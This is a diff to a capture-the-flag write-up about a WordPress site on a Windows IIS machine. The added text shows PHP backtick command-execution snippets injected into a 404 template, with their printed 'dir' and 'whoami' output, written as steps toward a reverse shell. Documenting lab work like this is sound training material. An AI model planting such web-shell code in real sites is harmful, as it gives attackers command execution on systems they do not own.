@@ -100,8 +100,36 @@ Then, by going to a page on /retro's index.php that I know (or am like 99% sure)
 
 Then goal is to make the 404 actually return a reverse shell, since I know this is a windows machine let's see if I can get some more info.
 
+```php
+<?php echo `dir`;?>
+```
 
+```
+Volume in drive C has no label. Volume Serial Number is 7443-948C Directory of C:\inetpub\wwwroot\retro 12/08/2019 05:02 PM
+. 12/08/2019 05:02 PM
+.. 05/30/2019 02:55 AM 420 index.php 05/30/2019 02:55 AM 19,935 license.txt 05/30/2019 02:55 AM 7,447 readme.html 05/30/2019 02:55 AM 6,919 wp-activate.php 12/08/2019 05:02 PM
+wp-admin 05/30/2019 02:55 AM 369 wp-blog-header.php 05/30/2019 02:55 AM 2,283 wp-comments-post.php 05/30/2019 05:17 AM 2,853 wp-config-sample.php 12/08/2019 06:31 PM 2,849 wp-config.php 12/08/2019 06:31 PM
+wp-content 05/30/2019 02:55 AM 3,847 wp-cron.php 12/08/2019 05:02 PM
+wp-includes 05/30/2019 02:55 AM 2,502 wp-links-opml.php 05/30/2019 02:55 AM 3,306 wp-load.php 05/30/2019 02:55 AM 39,574 wp-login.php 05/30/2019 02:55 AM 8,403 wp-mail.php 05/30/2019 02:55 AM 18,962 wp-settings.php 05/30/2019 02:55 AM 31,085 wp-signup.php 05/30/2019 02:55 AM 4,764 wp-trackback.php 05/30/2019 02:55 AM 3,068 xmlrpc.php 17 File(s) 158,586 bytes 5 Dir(s) 30,425,051,136 bytes free 
+```
+```php
+<?php echo `dir ..\`;?>
+```
 
+```
+Volume in drive C has no label. Volume Serial Number is 7443-948C Directory of C:\inetpub\wwwroot 12/08/2019 05:02 PM
+. 12/08/2019 05:02 PM
+.. 12/08/2019 04:52 PM 703 iisstart.htm 12/08/2019 04:52 PM 99,710 iisstart.png 12/08/2019 05:02 PM
+retro 2 File(s) 100,413 bytes 3 Dir(s) 30,425,051,136 bytes free 
+```
+**note, going back farther throws and error**
+
+```php
+<?php echo `whoami`;?>
+```
+```
+nt authority\iusr 
+```
 
 
 
